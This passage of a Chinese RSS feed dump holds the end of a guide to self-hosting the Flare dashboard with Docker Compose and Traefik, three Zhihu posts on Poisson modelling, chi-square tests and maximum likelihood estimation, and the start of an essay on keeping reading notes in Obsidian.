文件后，将其保存为 <code>docker-compose.yml</code>，然后运行 <code>docker-compose up -d</code>。</p>\n<p>稍等片刻，就能在 <code>http://localhost:5005</code> 看到 Flare 的界面了。</p>\n<h3>进阶用法：在公网服务器上使用</h3>\n<p>尽管 Flare 的常见使用场景是在本地运行，但也不排除有的小伙伴希望软件能够跑在云服务器上，比如让吃灰久矣的「轻量云」焕发生机。这就会涉及到两个问题：如何增加登录要求，防止未经授权的访问和修改；以及如何配置自定义域名和反向代理。</p>\n<p>对于前者，Flare 支持通过 <code>--nologin</code> 参数来关闭默认的「免登录模式」：</p>\n<pre class=\"language-Bash\"><code>flare --nologin=0</code></pre>\n<p>默认情况下，程序会使用 <code>flare</code> 作为账户名称，并随机生成的管理密码。这可以从运行时输出的日志看到。如果我们想使用自己的指定账号和密码登录的话，可以通过在环境变量中设置 <code>FLARE_USER</code> 和 <code>FLARE_PASS</code> 来实现。</p>\n<p>因此，如果使用 Compose 文件来表述，完整的配置是：</p>\n<pre class=\"language-YAML\"><code>version: '3.6'\nservices:\n  flare:\n    image: soulteary/flare:0.2.7\n    restart: always\n    command: flare --nologin=0\n    # 关闭免登录模式\n    environment:\n      - FLARE_USER=flare\n      # 指定的用户名\n      - FLARE_PASS=password\n      # 指定的密码\n    ports:\n      - 5005:5005\n    volumes:\n      - ./app:/app</code></pre>\n<p>至于第二个需求，即配置自定义域名和反向代理，我推荐使用 Traefik。这是一个现代的反向代理和负载均衡工具，相比于传统的 Apache、nginx，与 Docker 搭配使用更为方便。</p>\n<p>如果你还没有玩过它，可以参考 <a href=\"https://github.com/soulteary/traefik-example/\">这个项目</a>，来快速上手，或者阅读我以往的包含 <a href=\"https://soulteary.com/tags/traefik.html\" target=\"_blank\">Traefik 使用的技术文章</a>。</p>\n<p>我提前写好了一个搭配 Traefik 使用 Flare 的 Compose 文件，请在 <a href=\"https://github.com/soulteary/traefik-example/blob/main/docker-compose.flare.yml\" target=\"_blank\">这里</a> 获取并查阅其中的注释说明，这里就不多着墨了。</p>\n<h2>写在最后</h2>\n<p>如果你觉得这个项目有帮到你，欢迎对本文进行点赞转发，让其他的小伙伴也能看到它（用户反馈越多，更新越快）。</p>\n<p>如果你是一个代码爱好者，还可以在 GitHub 中为项目点赞给予制作人一个小小的鼓励；如果你希望收到这个项目的更新推送，建议点击 GitHub 项目中的关注并选择适合自己的关注模式，推荐选择 release 模式，一旦有新版出现，你会第一时间得到推送提醒。</p>\n<p>当然，非常欢迎你在我主要出没的地方进行留言反馈，一起改进 Flare 的体验。</p>\n<h2>延伸阅读</h2>\n<p>如果你对 Flare 的制作过程感兴趣，可以移步 <a href=\"https://soulteary.com/2022/01/19/flare-production-record-application-frontend-and-backend-performance-optimization.html\" target=\"_blank\">《Flare 制作记录：应用前后端性能优化》</a> 这篇文章，分享了不少优化的思路和细节。</p>\n<p>除此之外，为了方便你使用和调整 Flare，还可以参考下面的文档：</p>\n<ul>\n<li><a href=\"https://github.com/soulteary/docker-flare/blob/main/docs/advanced-startup.md\" target=\"_blank\">《Flare - 自定义启动参数》</a></li>\n<li><a href=\"https://github.com/soulteary/docker-flare/blob/main/docs/application-account.md\" target=\"_blank\">《关闭免登陆模式后，如何设置用户账号》</a></li>\n<li><a href=\"https://github.com/soulteary/docker-flare/blob/main/docs/material-design-icons.md\" target=\"_blank\">《如何挑选和使用图标》</a></li>\n<li><a href=\"https://github.com/soulteary/traefik-example\" target=\"_blank\">《如何和 Traefik 一起使用》</a></li>\n</ul>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71555"},{"title":"了解最基础的统计建模","date":"2022-02-20 03:08:01","description":"\n<p data-pid=\"pdv1U1Hu\">George Edward Pelham Box, 伦敦学院大学博士，专于研究质量管理、时间序列分析、实验设计和 贝叶斯推理， 被称作 \"one of the great statistical minds of the 20th century\"说过：</p>\n<p data-pid=\"J4jSR830\"><b>                                 All models are wrong, but some are useful.</b></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-24a2ead794bd0058b4f4eca5a6f8c2fa_b.jpg\" data-caption=\"\" data-rawwidth=\"336\" data-rawheight=\"335\" class=\"content_image\" width=\"336\"></figure><p data-pid=\"EYlwAafw\">                                George Edward Pelham Box (1919 - 2013)</p>\n<p data-pid=\"f0NEv5be\">有很多人理解经济模式、统计模式、计量经济模式、概率模式存在的意义，确实很多时候通过模式（model）得到的预测并不准确，可这些模式还是有它们存在的意义。人们通过模式用过去的数据来预测人们未来的行为及其结果，可是人类的行为是不可预测的，这就是为什么模式看似“没用”。在这些学术研究里，没有如物理一样的，永远不会被违反的地心引力。因为人是不可控的，在不一样的情景里，人们的行为会改变，所以我们需要做出不同的假设，代入不同的因素，用最适当的模式来解释发生的一切。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"cmeTVhSc\">今天就和大家来讲讲简单的Statistical Modelling是怎么做的。</p>\n<p data-pid=\"NQQcQFmN\">简单来说，有3个步骤：采集数据，根据采集的数据提出模式，最后用假设检验这个模式是否足够准确。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"4AlhvwZW\"><b>泊松模型 (Poisson Modelling)</b></p>\n<p data-pid=\"8J6PXoX6\">一组数据显示，在伦敦，1096天中有903位85岁以上的男性逝世。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1b630a3dc48f3e144cd9b4d62c4be4e2_b.jpg\" data-caption=\"\" data-rawwidth=\"590\" data-rawheight=\"267\" class=\"origin_image zh-lightbox-thumb\" width=\"590\" data-original=\"https://pic3.zhimg.com/v2-1b630a3dc48f3e144cd9b4d62c4be4e2_r.jpg\"></figure><p data-pid=\"y6D9rQYc\">现在我们打算用泊松模型来建模每天逝世的85岁以上的男性。</p>\n<p data-pid=\"ruYxhARK\">预计的期望平均值是 <img src=\"https://www.zhihu.com/equation?tex=%5Cmu%5E%7Bcap%7D+%3D+%5Cfrac%7B903%7D%7B1096%7D%3D0.8239\" alt=\"\\mu^{cap} = \\frac{903}{1096}=0.8239\" eeimg=\"1\"></p>\n<p data-pid=\"oE_PTY0l\">设X为每日逝世的男性人数。</p>\n<p data-pid=\"X-CRHcm5\">根据泊松模型我们得到</p>\n<p data-pid=\"M5kBi72y\"><img src=\"https://www.zhihu.com/equation?tex=P%28X%3Dx%29+%3D+%5Cfrac%7Be%5E%7B-0.8239%7D%280.8238%5E%7Bx%7D%29%7D%7Bx%7D\" alt=\"P(X=x) = \\frac{e^{-0.8239}(0.8238^{x})}{x}\" eeimg=\"1\">  当 <img src=\"https://www.zhihu.com/equation?tex=x%3D0%2C1%2C2...+\" alt=\"x=0,1,2... \" eeimg=\"1\"></p>\n<p data-pid=\"FsIDIV0V\">接下来用拟合优度的卡方检验(Chi-square Goodness-of-fit Test)来检测泊松模型是否合适。</p>\n<p data-pid=\"T4iel0aS\"><img src=\"https://www.zhihu.com/equation?tex=H_%7Bo%7D\" alt=\"H_{o}\" eeimg=\"1\"> ：泊松模型是成立的</p>\n<p data-pid=\"Z3Nd6Emt\"><img src=\"https://www.zhihu.com/equation?tex=H_%7B1+%7D\" alt=\"H_{1 }\" eeimg=\"1\"> ：泊松模型是不成立的</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9b2bf18c4058c8b111400ec49d1fe1b0_b.jpg\" data-caption=\"\" data-rawwidth=\"523\" data-rawheight=\"229\" class=\"origin_image zh-lightbox-thumb\" width=\"523\" data-original=\"https://pic1.zhimg.com/v2-9b2bf18c4058c8b111400ec49d1fe1b0_r.jpg\"></figure><p data-pid=\"WDB0aFZj\">用泊松模型预计0人死亡的天数 <img src=\"https://www.zhihu.com/equation?tex=%3D1096%5Ctimes0.438717%3D480.834+\" alt=\"=1096\\times0.438717=480.834 \" eeimg=\"1\"></p>\n<p data-pid=\"npWpA0Q-\">用泊松模型预计1人死亡的天数 <img src=\"https://www.zhihu.com/equation?tex=%3D+1096+%5Ctimes+0.361459%3D396.159\" alt=\"= 1096 \\times 0.361459=396.159\" eeimg=\"1\"></p>\n<p data-pid=\"JjsJIUtn\">以此类推</p>\n<p data-pid=\"viadflZd\">这里有一个要注意的点，当预计天数少过5的时候,我们要把那些天数和前一个天数相加，所以最后的模型预计数据是</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-429fd3a595e4351eb4f6172376a99e79_b.jpg\" data-caption=\"\" data-rawwidth=\"546\" data-rawheight=\"197\" class=\"origin_image zh-lightbox-thumb\" width=\"546\" data-original=\"https://pic2.zhimg.com/v2-429fd3a595e4351eb4f6172376a99e79_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"BifgnExq\">我们现在可以算卡方检验统计了：</p>\n<p data-pid=\"6H8SE_3s\"><img src=\"https://www.zhihu.com/equation?tex=%5Cchi%5E%7B2%7D+%3D+%5Csum_%7B%7D%5E%7B%7D+%5Cfrac%7B%28%7B%E5%AE%9E%E9%99%85%E5%A4%A9%E6%95%B0-%E9%A2%84%E6%B5%8B%E5%A4%A9%E6%95%B0%7D%29%5E%7B2%7D%7D%7B%E9%A2%84%E6%B5%8B%E5%A4%A9%E6%95%B0%7D+\" alt=\"\\chi^{2} = \\sum_{}^{} \\frac{({实际天数-预测天数})^{2}}{预测天数} \" eeimg=\"1\"><img src=\"https://www.zhihu.com/equation?tex=%3D%5Cfrac%7B%7B%28484-480.834%29%7D%5E%7B2%7D%7D%7B480.834%7D%2B%5Cfrac%7B%7B%28391-396.159%29%7D%5E%7B2%7D%7D%7B396.159%7D%2B%5Cfrac%7B%7B%28164-163.198%29%7D%5E%7B2%7D%7D%7B163.198%7D%2B%5Cfrac%7B%7B%2845-44.820%29%7D%5E%7B2%7D%7D%7B44.820%7D%2B%5Cfrac%7B%7B%2812-10.99%29%7D%5E%7B2%7D%7D%7B10.99%7D%3D0.1857\" alt=\"=\\frac{{(484-480.834)}^{2}}{480.834}+\\frac{{(391-396.159)}^{2}}{396.159}+\\frac{{(164-163.198)}^{2}}{163.198}+\\frac{{(45-44.820)}^{2}}{44.820}+\\frac{{(12-10.99)}^{2}}{10.99}=0.1857\" eeimg=\"1\"></p>\n<p data-pid=\"019-_tWa\"><img src=\"https://www.zhihu.com/equation?tex=%7B%5Cchi%7D%5E%7B2%7D\" alt=\"{\\chi}^{2}\" eeimg=\"1\">  的自由度 = 总行数 <img src=\"https://www.zhihu.com/equation?tex=-1-+\" alt=\"-1- \" eeimg=\"1\"> 模型里的估量参数 =  <img src=\"https://www.zhihu.com/equation?tex=5-1-1%3D3+\" alt=\"5-1-1=3 \" eeimg=\"1\"></p>\n<p data-pid=\"eM_x6wOb\">如果 <img src=\"https://www.zhihu.com/equation?tex=%7B%5Cchi%7D%5E%7B2%7D%5Csucc%7B%5Cchi%7D_%7B0.01%2C3%7D%5E%7B2%7D%3D11.345\" alt=\"{\\chi}^{2}\\succ{\\chi}_{0.01,3}^{2}=11.345\" eeimg=\"1\"> ,拒绝 <img src=\"https://www.zhihu.com/equation?tex=H_%7Bo%7D+\" alt=\"H_{o} \" eeimg=\"1\"> ，不然，不拒绝 <img src=\"https://www.zhihu.com/equation?tex=H_%7Bo%7D\" alt=\"H_{o}\" eeimg=\"1\"></p>\n<p data-pid=\"sicRo2_0\"><img src=\"https://www.zhihu.com/equation?tex=0.1857%5Cprec11.345+\" alt=\"0.1857\\prec11.345 \" eeimg=\"1\"> ，不拒绝 <img src=\"https://www.zhihu.com/equation?tex=H_%7Bo%7D+\" alt=\"H_{o} \" eeimg=\"1\"></p>\n<p data-pid=\"sIkaT9n1\">根据我们取得的数据我们无法在0.01显著性水平证明泊松模型是不适合的。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"VhNwnrLE\">以上数据都是为了理解统计建模的例子，并不准确。</p>\n<hr>\n<p data-pid=\"7KQ6W2aE\">一点点自己的想法：</p>\n<p data-pid=\"E9CN0NLV\">回想当初最开始接触统计的时候并不知道学分布、可靠区间、假设验证的意义在哪儿。只是老师说这种情况下要用这种分布，我们做假设验证第一步设 <img src=\"https://www.zhihu.com/equation?tex=H_%7Bo%7D+\" alt=\"H_{o} \" eeimg=\"1\"> 和 <img src=\"https://www.zhihu.com/equation?tex=H_%7B1+%7D\" alt=\"H_{1 }\" eeimg=\"1\"> ，然后如何如何就跟着做。一步一步学下来，现在才窥视到一点统计和概率的应用，以前学的知识也慢慢地串在了一起。</p>\n<p data-pid=\"m7GYSZHE\">上个学期学统计真的学得挺痛苦的，我本身也不是有天赋的学生，上课听不懂，下课还要自己上网查资料看视频学。不过到最后真的觉得自己付出的努力都是值得的，我还想学更多统计的知识，期待自己能自如运用的那天。</p>\n<p data-pid=\"5S8J7xXj\">共勉</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"ntIeCTpu\">Reference</p>\n<p data-pid=\"Ca1gg-GQ\"><a href=\"https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/George_E._P._Box\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">George E. P. Box</a></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lucia-90-71?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Lucia</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/29892231?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"参数估计：最大似然估计 (Maximum Likelihood Method - MLM)","date":"2022-02-20 03:07:50","description":"\n<p data-pid=\"rJvx1Ixl\">上一篇文章里， 我们大概了解了基本的统计建模。这一篇文章我们来谈谈参数估计。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"WqE40Lzw\">大家熟知的概率分布的类型，比如说泊松分布里有参数， <img src=\"https://www.zhihu.com/equation?tex=%5Clambda\" alt=\"\\lambda\" eeimg=\"1\"> ；伽玛分布里有参数， <img src=\"https://www.zhihu.com/equation?tex=%5Calpha+%E5%92%8C+%5Clambda+\" alt=\"\\alpha 和 \\lambda \" eeimg=\"1\"> 。 最开始大家做题里，这些参数都是已知的，可当我们想自己做统计建模时，我们又该如何得到这些参数？</p>\n<p data-pid=\"LlvYQtxC\">答案就是：参数估计。参数估计的方法有很多，今天和大家分享其中一种：最大似然估计 (Maximum Likelihood Method - MLM)。</p>\n<p data-pid=\"xQ5kd3ln\">最大似然估计的原理是根据概率密度函数或质量函数，计算最高概率产生观察数据的估量参数。</p>\n<p data-pid=\"DC7Xtj-W\">公式也很简单：</p>\n<p data-pid=\"84j7aGiC\"><img src=\"https://www.zhihu.com/equation?tex=L%28%5Ctheta%29+%3D+%5Cprod_%7Bn%7D%5E%7Bi%3D1%7D%5C+p_%7BX%7D+%28x_%7Bi%7D%3B%5Ctheta%29\" alt=\"L(\\theta) = \\prod_{n}^{i=1}\\ p_{X} (x_{i};\\theta)\" eeimg=\"1\"> (质量函数)</p>\n<p data-pid=\"nd8thkOA\"><img src=\"https://www.zhihu.com/equation?tex=L%28%5Ctheta%29+%3D+%5Cprod_%7Bn%7D%5E%7Bi%3D1%7D%5C+f_%7BY%7D+%28y_%7Bi%7D%3B%5Ctheta%29\" alt=\"L(\\theta) = \\prod_{n}^{i=1}\\ f_{Y} (y_{i};\\theta)\" eeimg=\"1\"> (概率密度函数)</p>\n<p data-pid=\"DeQdDdQ4\">这里 <img src=\"https://www.zhihu.com/equation?tex=%5Ctheta\" alt=\"\\theta\" eeimg=\"1\"> 是未知参数。</p>\n<p data-pid=\"Y_Oo_fzF\">通过MLM得到的估计参数的值会将 <img src=\"https://www.zhihu.com/equation?tex=L%28%5Ctheta%29\" alt=\"L(\\theta)\" eeimg=\"1\"> 最大化，即 <img src=\"https://www.zhihu.com/equation?tex=L%28%5Chat%7B%5Ctheta%7D_%7Bm%7D%29+%5Cgeq+L%28%5Ctheta%29\" alt=\"L(\\hat{\\theta}_{m}) \\geq L(\\theta)\" eeimg=\"1\"> 。</p>\n<p data-pid=\"VxSAqKCi\">我们只需要找出 <img src=\"https://www.zhihu.com/equation?tex=L%28%5Ctheta%29\" alt=\"L(\\theta)\" eeimg=\"1\"> 对 <img src=\"https://www.zhihu.com/equation?tex=%5Ctheta\" alt=\"\\theta\" eeimg=\"1\"> 的一阶导数，就可以得到 <img src=\"https://www.zhihu.com/equation?tex=%5Chat%7B%5Ctheta%7D_%7Bm%7D\" alt=\"\\hat{\\theta}_{m}\" eeimg=\"1\"> ，这个样本对应的估量参数。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"cz_nigS4\">接下来我们看一下两道简单的例题来了解MLM是怎么应用的。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"H8oqaliZ\">1) 从伽马分布中提取n个随机样本，伽玛分布的参数 <img src=\"https://www.zhihu.com/equation?tex=%5Calpha\" alt=\"\\alpha\" eeimg=\"1\"> 是已知的。求 <img src=\"https://www.zhihu.com/equation?tex=%5Clambda\" alt=\"\\lambda\" eeimg=\"1\"> 的最大似然估计量。</p>\n<p data-pid=\"pvKcl7Mj\">伽玛分布的概率密度函数：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-2e1d63fca010a17cd8ad85353089c5df_b.jpg\" data-caption=\"\" data-rawwidth=\"210\" data-rawheight=\"52\" class=\"content_image\" width=\"210\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-abe0dabd45d3d247bc0803e43ac7ddce_b.jpg\" data-caption=\"\" data-rawwidth=\"543\" data-rawheight=\"144\" class=\"origin_image zh-lightbox-thumb\" width=\"543\" data-original=\"https://pic3.zhimg.com/v2-abe0dabd45d3d247bc0803e43ac7ddce_r.jpg\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-dda0e4110458c703f81497c703d9a323_b.jpg\" data-caption=\"\" data-rawwidth=\"209\" data-rawheight=\"91\" class=\"content_image\" width=\"209\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"GTImb6jf\">2) 一个随机变量X有帕累托分布，其概率密度函数为：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-471883dc0c7d4b952ad3a51c3257a46a_b.jpg\" data-caption=\"\" data-rawwidth=\"303\" data-rawheight=\"94\" class=\"content_image\" width=\"303\"></figure><p data-pid=\"Zv35ZvXG\"><img src=\"https://www.zhihu.com/equation?tex=%5Calpha+%3E+1+\" alt=\"\\alpha &gt; 1 \" eeimg=\"1\"> 。 </p>\n<p data-pid=\"7Tn3l4Hu\">从帕累托分布中提取n个随机样本，求：</p>\n<p data-pid=\"_V4fCeqH\">a) <img src=\"https://www.zhihu.com/equation?tex=%5Calpha+\" alt=\"\\alpha \" eeimg=\"1\"> 的参数估计，用MLM。</p>\n<p data-pid=\"0n6-cm7P\">b) 从帕累托分布中，取得一个随机样本，其中有5个观察数据，分别为：1.7，2.6，1.4，1.8，1.1。根据a)中得到的参数估计来计算这个样本的参数 <img src=\"https://www.zhihu.com/equation?tex=%5Calpha+\" alt=\"\\alpha \" eeimg=\"1\"> 。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"EK8IyO8m\">a) </p>\n<figure><img src=\"https://pic1.zhimg.com/v2-77cf1a27ee3ce3ad2ec2db37b567b084_b.jpg\" data-caption=\"\" data-rawwidth=\"419\" data-rawheight=\"253\" class=\"content_image\" width=\"419\"></figure><p data-pid=\"-YtadHDs\">b) 根据观察数据得出</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-43b90a4f9c06901d1c0eb3ed82903800_b.jpg\" data-caption=\"\" data-rawwidth=\"234\" data-rawheight=\"129\" class=\"content_image\" width=\"234\"></figure><p data-pid=\"L-tsF_vO\">得到了估量参数就可以放入自己的模型里来预测其他的值。估量真的是经济、统计里特别重要的一个概念呢，特别尊重各位想出来估量方法的学者们。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"55-s8wkk\">作者的话：</p>\n<p data-pid=\"9gTU7bj9\">好啦今天就说道这里啦。最近好久没更真的特别抱歉，学校事情有点多，以后会督促自己勤快更新的~</p>\n<p data-pid=\"QTvKSj4n\">这里还给大家带来了一个好消息～</p>\n<p data-pid=\"kXaRJtyF\">为了能将我们喜爱的经济知识分享给更多的人，我们的微信公众号要上线啦！ ！ ！ </p>\n<p data-pid=\"YbP498pl\">里面会有更新鲜、有趣的文章，让更多的人可以愉快地了解经济和相关实事。</p>\n<p data-pid=\"YSDKrp5A\">这个礼拜北美的星期三,北京时间的星期四,请关注 \"Lucy的经济日记”！期待与你相见！</p>\n<p data-pid=\"-chW0oNd\">（快来找我们玩！ ！ ！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lucia-90-71?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Lucia</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/30983666?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"参数估计：最大似然估计 (Maximum Likelihood Method - MLM) Ⅱ","date":"2022-02-20 03:07:46","description":"\n<p data-pid=\"STmkZH1P\">上一篇讲最大似然估计的文章有一些读者反映看不太懂，也有读者提出了很多很好的问题。上一篇文章跟大家大概讲了一下最大似然估计的用法，这一篇会更加具体地带例题解释，并且解答大家的疑惑。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"tqmAF5T2\">似然函数(Likelihood Function)的公式：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-b4f5eeaea8fdcefc82cb01a0cb5fb140_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"278\" data-rawheight=\"88\" class=\"content_image\" width=\"278\"></figure><p data-pid=\"IfXkxhP4\">这里质量函数的似然函数很好理解，不过为什么密度函数的似然函数也只需要相乘呢？</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"9hVLm1rc\">我们首先要理解，使用参数估计的前提是我们已经有了数据。收集到了数据，建立了统计模型之后，根据我们已有的数据来估计这个模型的参数是什么。那应该如何估计参数呢？最大似然估计就假设将我们手中的数据可能性最大化，设一阶导数为零，来获取参数估计。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"jpzVuJh9\">随机变量分为离散和连续两种，可在实际数据收集的过程中连续的数据都会在某个小数位被四舍五入，因此我的得到数据点x的概率为</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3e0a44710f5115cfd3ac846c3484f498_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"385\" data-rawheight=\"34\" class=\"content_image\" width=\"385\"></figure><p data-pid=\"516W4f61\">X 在这里为数据点x 代表的连续的测量。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-458edbfbd55844c1f8be639c55fba4a5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"406\" data-rawheight=\"73\" class=\"content_image\" width=\"406\"></figure><p data-pid=\"B5PUFeKG\"><br>因此数据点x的概率和X = x的密度函数形成一定比率，ε 可以被忽略不计。密度函数f(x; θ) 因此被用于似然函数里。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"02UxyWKX\">接下来说一个二项分布 (Binomial Distribution) 的例子：</p>\n<p data-pid=\"lLNqG_-d\">为了调查城市人口的性别，我们从城市人口中抽取一小部分调查询问。</p>\n<p data-pid=\"pHO_cK7_\"><br>定义二项分布的质量函数为:</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-9c1f9fc62f329fce3077fe427299e8de_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"49\" data-rawheight=\"23\" class=\"content_image\" width=\"49\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"ynxIZGO1\">p = 是男性的可能性</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-8d6d9ae112c821c2ea1819aae8921f91_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"508\" data-rawheight=\"237\" class=\"origin_image zh-lightbox-thumb\" width=\"508\" data-original=\"https://pic2.zhimg.com/v2-8d6d9ae112c821c2ea1819aae8921f91_r.jpg\"></figure><p data-pid=\"43yqPf2w\">有很多个数据点，我们得到：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a7237e26ff30451dc5cc61d14dfc9d25_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"420\" data-rawheight=\"106\" class=\"content_image\" width=\"420\"></figure><p data-pid=\"vbs5RdeI\">可是我们发现 L(p)这个式子太复杂，都是乘在一起的。</p>\n<p data-pid=\"AF-zfAVh\"><br>为了方便求一阶导数，我们找 ln(L(p)),</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-42408b97055371a6e923c8d341c40948_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"535\" data-rawheight=\"162\" class=\"origin_image zh-lightbox-thumb\" width=\"535\" data-original=\"https://pic1.zhimg.com/v2-42408b97055371a6e923c8d341c40948_r.jpg\"></figure><p data-pid=\"b6aEVW31\">这次查了点资料，又提供了一个简单的例子来解释最大似然估计是如何使用的，希望这次能帮大家解惑。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"dfg2Nfhb\">Reference: “Applied Statistical Inference” by Leonhard Held and Daniel Sabanés Bové</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lucia-90-71?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Lucia</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/34221289?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"年度征文 | 重塑读书笔记：Obsidian 下的图书阅读","date":"2022-02-19 10:14:29","description":"\n<p><strong>编注：</strong></p>\n<p>本文是少数派 <a href=\"https://sspai.com/post/70693\" target=\"_blank\">2021 年度征文 </a>活动 <code>#生活 21</code> 标签下的入围文章。本文仅代表作者本人观点，少数派对标题和排版略作调整。</p>\n<p>和往年不同，今年文章的数据表现将很大程度上决定征文活动的最终走向，包括「双倍稿酬（由飞书赞助）」活动奖励、最终票选名单以及征文奖品类型。如果你喜欢这篇文章，不妨通过充电或评论的方式支持作者。</p>\n<hr>\n<p>在我们的工作或者生活当中，阅读是一个重要的获取知识方式。在诸多的阅读方式当中，纸质媒介是一种相当常见的媒介之一。而与之相应的则是阅读之后，建立在再利用之前材料的基础之上的输出，这种输出以我们常见的论文写作最为典型。每年的毕业论文、职称评审，都是一个「海量」阅读，「海量」输出的高峰。</p>\n<p>在此前的文章 <a href=\"https://sspai.com/prime/story/vol014-how-to-work-with-paper-and-pen\" target=\"_blank\">年末备考冲刺，这是我的纸笔方法论</a> 当中我曾经提到过在撰写论文的时候使用过文摘卡这一工具。我个人感觉，文摘卡在进行纸质书阅读的时候，是非常好用的一种工具。它上面详细载明了关于一本书的内容，包括书名、作者、内容摘要等信息，在后续再次引用的时候非常方便。而且这种小小的纸卡携带的时候也轻松方便。尽管文摘卡有着诸多的优点，但是在处处数字化的今天，文摘卡最大的一个缺点就是手写的内容二次利用麻烦，也就是数字化的问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/0448ec13ebc79cb77c5b0602dbc0c3d6.png\"></figure><p>同样，在 <a href=\"https://sspai.com/prime/story/vol014-how-to-work-with-paper-and-pen\" target=\"_blank\">年末备考冲刺，这是我的纸笔方法论</a> 一文中，我使用纸笔做笔记的主要方法就是利用思维导图将散落于各处的知识点进行整合，最终形成了一个知识点的图谱。</p>\n<p>实际上，我也在阅读中采用了类似的方法。2021 年，obsidian 横空出世，它给了不少人以想象的空间，这当中也包括我。于是我对于我的读书的方法论进行了再一次调整。</p>\n<h2>纸质书阅读时遇到的问题</h2>\n<p>阅读的目的是将图书中对自己有用的知识提取出来，并通过整理以备后续的使用。在阅读中遇到的问题也主要是与知识的处理、应用与内化相关。</p>\n<h3>知识的处理与归档</h3>\n<p>此前在阅读纸质图书的时候，我通常采用的办法就是文摘卡加上纸质的读书笔记。这些记录在纸本之上的内容对于帮助记忆很有用，但是它们不得不面对着一个数字化的问题。在写论文的时候，这个问题会变得比较夸张，一桌子的文摘卡最终要转换成 Word 文件中的一个个字符。当时为了解决这个问题，我把这些会用到的文摘卡或者笔记集中拍照，然后在电脑上采用上图下文的形式，人肉进行图文识别。</p>\n<p>在此之后，以涂书笔记为代表的一些主打读书笔记的 App 兴起之后，这种状况有所缓解。这些读书笔记 App 部分地解决了我的痛点——文字 OCR 